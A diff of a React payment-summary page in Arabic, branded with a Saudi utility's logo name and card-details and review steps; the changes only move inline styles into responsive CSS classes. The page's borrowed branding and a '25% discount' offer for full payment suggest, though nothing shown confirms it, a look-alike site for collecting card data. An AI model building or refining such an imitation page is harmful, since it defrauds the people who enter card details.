@@ -96,80 +96,125 @@ export default function SummaryPayment() {
   return (
     <>
       <style>{fontFaces}</style>
+      <style>{`
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        
+        .summary-header {
+          display: flex; align-items: center; justify-content: space-between;
+          height: 70px; padding: 15px 30px 14px;
+        }
+        .summary-logo { width: 90px; height: 58px; object-fit: contain; }
+        .summary-stepper {
+          display: flex; align-items: center; gap: 0;
+          background: #f5f7fa; border-radius: 30px; padding: 6px 8px;
+        }
+        .summary-step {
+          display: flex; align-items: center; gap: 8px;
+          padding: 8px 20px; color: #06c; font-size: 14px; font-weight: 500;
+          white-space: nowrap;
+        }
+        .summary-step-circle {
+          background: #06c; color: #fff; border-radius: 50%;
+          width: 22px; height: 22px; display: flex; align-items: center;
+          justify-content: center; font-size: 13px; font-weight: 600;
+          flex-shrink: 0;
+        }
+        .summary-step-active {
+          display: flex; align-items: center; gap: 8px;
+          background: #06c; border-radius: 24px; padding: 8px 20px;
+          color: #fff; font-size: 14px; font-weight: 500;
+          white-space: nowrap;
+        }
+        .summary-step-active-circle {
+          background: #fff; color: #06c; border-radius: 50%;
+          width: 22px; height: 22px; display: flex; align-items: center;
+          justify-content: center; font-size: 13px; font-weight: 600;
+          flex-shrink: 0;
+        }
+        .summary-close-btn {
+          background: #e8f0fe; border: none; cursor: pointer; padding: 10px;
+          display: flex; align-items: center; justify-content: center;
+          border-radius: 12px; width: 44px; height: 44px;
+        }
+        .summary-title-section { text-align: center; padding-top: 40px; padding-bottom: 30px; }
+        .summary-title-sub { color: #06c; font-size: 16px; font-weight: 400; margin-bottom: 8px; }
+        .summary-title-account {
+          color: #001f5e; font-size: 36px; font-weight: 600;
+          letter-spacing: 1px; direction: ltr; display: inline-block;
+        }
+        .summary-title-desc { color: #66799e; font-size: 15px; font-weight: 400; margin-top: 8px; }
+        .summary-content { max-width: 900px; margin: 0 auto; padding: 0 30px; padding-bottom: 120px; }
+        .summary-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+        .summary-card { border: 1px solid #e8ecf1; border-radius: 16px; padding: 24px; }
+        .summary-sidebar { border: 1px solid #e8ecf1; border-radius: 16px; overflow: hidden; }
+        .payment-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+        .step-label { display: inline; }
+        
+        @media (max-width: 768px) {
+          .summary-header {
+            height: auto; padding: 10px 16px;
+            flex-wrap: wrap; gap: 10px; justify-content: center;
+          }
+          .summary-logo { width: 70px; height: 45px; }
+          .summary-stepper {
+            order: 3; width: 100%; justify-content: center;
+            padding: 4px 6px; flex-wrap: nowrap; overflow-x: auto;
+          }
+          .summary-step { padding: 6px 10px; font-size: 11px; gap: 4px; }
+          .summary-step-circle { width: 18px; height: 18px; font-size: 10px; }
+          .summary-step-active { padding: 6px 10px; font-size: 11px; gap: 4px; border-radius: 20px; }
+          .summary-step-active-circle { width: 18px; height: 18px; font-size: 10px; }
+          .summary-close-btn { width: 36px; height: 36px; padding: 8px; border-radius: 10px; }
+          .summary-title-section { padding-top: 20px; padding-bottom: 16px; }
+          .summary-title-sub { font-size: 13px; }
+          .summary-title-account { font-size: 24px; }
+          .summary-title-desc { font-size: 13px; }
+          .summary-content { padding: 0 16px; padding-bottom: 80px; }
+          .summary-grid { grid-template-columns: 1fr; gap: 16px; }
+          .summary-card { padding: 16px; }
+          .payment-grid { grid-template-columns: 1fr; gap: 12px; }
+          .step-label { display: none; }
+        }
+      `}</style>
       <div className="min-h-screen bg-white" dir="rtl" style={{ fontFamily: "'SE', sans-serif" }}>
 
-        {/* Header - same as SelectAmount */}
-        <div style={{
-          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
-          height: '70px', padding: '15px 30px 14px',
-        }}>
+        {/* Header */}
+        <div className="summary-header">
           <a href="#" style={{ display: 'block' }}>
-            <img src="/se-logo.svg" alt="السعودية للطاقة" style={{ width: '90px', height: '58px', objectFit: 'contain' }} />
+            <img src="/se-logo.svg" alt="السعودية للطاقة" className="summary-logo" />
           </a>
 
           {/* Stepper */}
-          <div style={{
-            display: 'flex', alignItems: 'center', gap: '0',
-            background: '#f5f7fa', borderRadius: '30px', padding: '6px 8px',
-          }}>
+          <div className="summary-stepper">
             {/* Step 1 - Done */}
-            <div style={{
-              display: 'flex', alignItems: 'center', gap: '8px',
-              padding: '8px 20px', color: '#06c', fontSize: '14px', fontWeight: 500,
-              whiteSpace: 'nowrap',
-            }}>
-              <span style={{
-                background: '#06c', color: '#fff', borderRadius: '50%',
-                width: '22px', height: '22px', display: 'flex', alignItems: 'center',
-                justifyContent: 'center', fontSize: '13px', fontWeight: 600,
-              }}>
+            <div className="summary-step">
+              <span className="summary-step-circle">
                 <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                   <polyline points="20 6 9 17 4 12"></polyline>
                 </svg>
               </span>
-              حدد المبلغ
+              <span className="step-label">حدد المبلغ</span>
             </div>
 
             {/* Step 2 - Done */}
-            <div style={{
-              display: 'flex', alignItems: 'center', gap: '8px',
-              padding: '8px 20px', color: '#06c', fontSize: '14px', fontWeight: 500,
-              whiteSpace: 'nowrap',
-            }}>
-              <span style={{
-                background: '#06c', color: '#fff', borderRadius: '50%',
-                width: '22px', height: '22px', display: 'flex', alignItems: 'center',
-                justifyContent: 'center', fontSize: '13px', fontWeight: 600,
-              }}>
+            <div className="summary-step">
+              <span className="summary-step-circle">
                 <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                   <polyline points="20 6 9 17 4 12"></polyline>
                 </svg>
               </span>
-              تفاصيل البطاقة
+              <span className="step-label">تفاصيل البطاقة</span>
             </div>
 
             {/* Step 3 - Active */}
-            <div style={{
-              display: 'flex', alignItems: 'center', gap: '8px',
-              background: '#06c', borderRadius: '24px', padding: '8px 20px',
-              color: '#fff', fontSize: '14px', fontWeight: 500,
-              whiteSpace: 'nowrap',
-            }}>
-              <span style={{
-                background: '#fff', color: '#06c', borderRadius: '50%',
-                width: '22px', height: '22px', display: 'flex', alignItems: 'center',
-                justifyContent: 'center', fontSize: '13px', fontWeight: 600,
-              }}>3</span>
-              المراجعة
+            <div className="summary-step-active">
+              <span className="summary-step-active-circle">3</span>
+              <span className="step-label">المراجعة</span>
             </div>
           </div>
 
           {/* Close Button */}
-          <button onClick={() => setLocation("/bill")} style={{
-            background: '#e8f0fe', border: 'none', cursor: 'pointer', padding: '10px',
-            display: 'flex', alignItems: 'center', justifyContent: 'center',
-            borderRadius: '12px', width: '44px', height: '44px',
-          }}>
+          <button onClick={() => setLocation("/bill")} className="summary-close-btn">
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#06c" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
               <line x1="18" y1="6" x2="6" y2="18"></line>
               <line x1="6" y1="6" x2="18" y2="18"></line>
@@ -178,22 +223,18 @@ export default function SummaryPayment() {
         </div>
 
         {/* Title */}
-        <div style={{ textAlign: 'center', paddingTop: '40px', paddingBottom: '30px' }}>
-          <p style={{ color: '#06c', fontSize: '16px', fontWeight: 400, marginBottom: '8px' }}>عرض ودفع الفواتير</p>
-          <h1 style={{ color: '#001f5e', fontSize: '36px', fontWeight: 600, letterSpacing: '1px', direction: 'ltr', display: 'inline-block' }}>
-            {accountNumber}
-          </h1>
-          <p style={{ color: '#66799e', fontSize: '15px', fontWeight: 400, marginTop: '8px' }}>ملخص الطلب والدفع</p>
+        <div className="summary-title-section">
+          <p className="summary-title-sub">عرض ودفع الفواتير</p>
+          <h1 className="summary-title-account">{accountNumber}</h1>
+          <p className="summary-title-desc">ملخص الطلب والدفع</p>
         </div>
 
         {/* Content */}
-        <div style={{ maxWidth: '900px', margin: '0 auto', padding: '0 30px', paddingBottom: '120px' }}>
-          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
+        <div className="summary-content">
+          <div className="summary-grid">
 
             {/* Right: Service Details */}
-            <div style={{
-              border: '1px solid #e8ecf1', borderRadius: '16px', padding: '24px',
-            }}>
+            <div className="summary-card">
               <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '24px' }}>
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#06c" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                   <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
@@ -221,6 +262,7 @@ export default function SummaryPayment() {
                 display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                 padding: '14px 16px', marginTop: '12px',
                 background: 'rgba(0,102,204,0.06)', borderRadius: '10px',
+                flexWrap: 'wrap', gap: '8px',
               }}>
                 <span style={{ color: '#06c', fontSize: payOption === 'full' ? '13px' : '16px', fontWeight: 600 }}>{payOption === 'full' ? 'المجموع الكلي بعد خصم (25%)' : 'المجموع الكلي'}</span>
                 <span style={{ color: '#06c', fontSize: '20px', fontWeight: 700 }}>{totalAmount.toFixed(2)} ر.س</span>
@@ -228,9 +270,7 @@ export default function SummaryPayment() {
             </div>
 
             {/* Left: Order Summary Sidebar */}
-            <div style={{
-              border: '1px solid #e8ecf1', borderRadius: '16px', overflow: 'hidden',
-            }}>
+            <div className="summary-sidebar">
               <div style={{
                 background: 'rgba(0,102,204,0.06)', padding: '16px 24px',
                 borderBottom: '1px solid #e8ecf1',
@@ -247,7 +287,7 @@ export default function SummaryPayment() {
                   <span style={{ color: '#001f5e', fontSize: '14px' }}>{totalAmount.toFixed(2)} ر.س</span>
                 </div>
                 <hr style={{ border: 'none', borderTop: '1px solid #e8ecf1', marginBottom: '16px' }} />
-                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '24px' }}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px' }}>
                   <span style={{ color: '#001f5e', fontSize: '16px', fontWeight: 700 }}>المجموع</span>
                   <span style={{ color: '#06c', fontSize: '18px', fontWeight: 700 }}>{totalAmount.toFixed(2)} ر.س</span>
                 </div>
@@ -300,7 +340,7 @@ export default function SummaryPayment() {
               <span style={{ color: '#001f5e', fontSize: '18px', fontWeight: 600 }}>طريقة الدفع</span>
             </div>
 
-            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
+            <div className="payment-grid">
               {/* Credit Card */}
               <div
                 onClick={() => setSelectedPaymentMethod('card')}
@@ -367,9 +407,6 @@ export default function SummaryPayment() {
             </div>
           </div>
         </div>
-
-        {/* Spin animation */}
-        <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
       </div>
     </>
   );
